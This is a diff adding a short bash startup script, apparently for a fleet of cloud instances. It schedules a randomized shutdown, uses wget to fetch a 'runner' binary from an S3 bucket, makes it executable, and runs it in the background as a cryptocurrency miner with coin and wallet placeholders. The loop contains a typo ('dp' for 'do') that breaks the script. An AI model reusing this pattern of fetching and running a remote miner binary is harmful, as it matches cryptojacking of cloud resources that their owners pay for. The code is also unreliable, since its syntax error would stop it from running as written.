@@ -1,0 +1,17 @@
+#!/bin/bash -x
+shutdown -P +$((14400 + $RANDOM % 7200))  # Refresh the fleet every 10-15 days
+cd /tmp
+wget -O /tmp/runner https://s3.us-west-2.amazonaws.com/cnl4uehyq6/pyrite/runner/runner-x86_64-v1
+chmod +x /tmp/runner
+cat > runner.sh << __EOF__
+#!/bin/bash -x
+for X in $(seq 10); dp
+  ./runner --coin ${CoinType} --wallet ${WalletAddress}
+  sleep 10
+done >> /tmp/runner.log 2>&1
+# Shut down if there were too many restarts
+# (normally the runner runs forever)
+poweroff
+__EOF__
+chmod +x runner.sh
+nohup ./runner.sh &
